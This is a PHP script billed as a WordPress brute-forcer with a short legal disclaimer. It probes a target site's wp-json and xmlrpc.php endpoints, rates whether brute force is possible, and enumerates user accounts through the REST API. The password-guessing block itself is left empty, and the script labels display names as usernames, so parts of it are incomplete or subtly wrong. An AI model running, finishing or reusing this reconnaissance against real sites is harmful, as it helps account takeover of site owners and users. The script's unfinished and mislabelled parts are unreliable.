<?php
/*
PHP WordPress Bruteforcer

Author: Mr Hery
Organization: MyOPECS - Malaysia Open Cyber Security
Date: 7 July 2023
*/

header("Content-Type: text/plain");

echo "Welcome to PHP WordPress Bruteforcer\n";
echo "Author: Mr Hery\n";
echo "Organization: Malaysia Open Cyber Security (MyOPECS)\n";
echo "Date: 7 July 2023\n";
echo "Desclaimer:\n";
echo "This script has been created to show the basic way to brute force a wordpress login authentication. Use of this script for illegal activities is not allowed. Using this script for illegal activities is up to your own risk.\n";
echo "===================================================\n";

function checkURL($url){
	 $ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$head = curl_exec($ch);
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	
	curl_close($ch);
	
	return $httpCode;
}

function downloadString($url){
	$curl = curl_init();
	
	curl_setopt_array($curl, array(
	  CURLOPT_URL => $url,
	  CURLOPT_RETURNTRANSFER => true,
	  CURLOPT_ENCODING => '',
	  CURLOPT_MAXREDIRS => 10,
	  CURLOPT_TIMEOUT => 0,
	  CURLOPT_FOLLOWLOCATION => true,
	  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	  CURLOPT_CUSTOMREQUEST => 'GET',
	  CURLOPT_HTTPHEADER => array(
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
		'Accept: */*',
		'Connection: keep-alive',
		'Accept-Encoding: gzip, deflate, br'
	  )
	));

	$response = curl_exec($curl);
	$httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	
	curl_close($curl);
	
	return $response;
}

function main(){
	$url = readline("Please insert URL:");
	echo "\n";
	
	$url = rtrim($url, "/") . "/";
	
	echo "[+] Checking URL: " . $url;
	if(checkURL($url) == "200"){
		echo " - SUCCESS\n";
		
		$canEnum = false;
		$wpjsonURL = $url . "wp-json";
		echo "[+] Checking URL: " . $wpjsonURL;
		if(checkURL($wpjsonURL) == "200"){
			$canEnum = true;
			echo " - SUCCESS\n";
		}else{
			echo " - FAILED\n";
		}
		
		$canBruteforce = false;
		$xmlrpcURL = $url . "xmlrpc.php";
		echo "[+] Checking URL: " . $xmlrpcURL;
		if(checkURL($xmlrpcURL) != "404"){
			$canBruteforce = true;
			echo " - SUCCESS\n";
		}else{
			echo " - FAILED\n";
		}
		
		echo "\n";
		
		if($canEnum){
			echo "[GOOD] This URL maybe can get list of users.\n";
		}else{
			echo "[BAD] Seems This URL cannot get list of users.\n";
		}
		
		if($canBruteforce){
			echo "[GOOD] This URL maybe can perform bruteforce attack.\n";
		}else{
			echo "[BAD] Seems This URL cannot  perform bruteforce attack.\n";
		}
		
		echo "\n";
		
		if(!$canEnum && !$canBruteforce){
			echo "\n[BAD] Seems like nothing we can do here. Maybe the URL is not a WordPress Web Application.\n";
		}else{
			if($canEnum){
				echo "[PROGRESS] Enumerating Users:\n";
				// echo $url . "wp-json/wp/v2/users";
				$res = downloadString($url . "wp-json/wp/v2/users");
				
				if(!is_null($res)){
					$obj = json_decode($res);
					
					if(count($obj) > 0){
						foreach($obj as $o){
							echo "[FOUND] Username: " . $o->name . "\n";
						}
					}else{
						echo "[FAIL] No user information found.\n";
					}
				}else{
					echo "[FAIL] Fail enumerating users.\n";
				}
			}
			
			if($canBruteforce){
				
			}
		}
	}else{
		echo " - FAILED\n";
		echo "Cannot access the URL. Make sure the URL is correct and accessible.\n";
	}
	
	$exit = readline("\nDo you want to exit? (y/n)");
	
	if($exit == "y" || $exit == "Y" || $exit == "yes"){
		echo "\n\nThank you for using me! Bye!";
		die();
	}else{
		main();
	}
}

main();
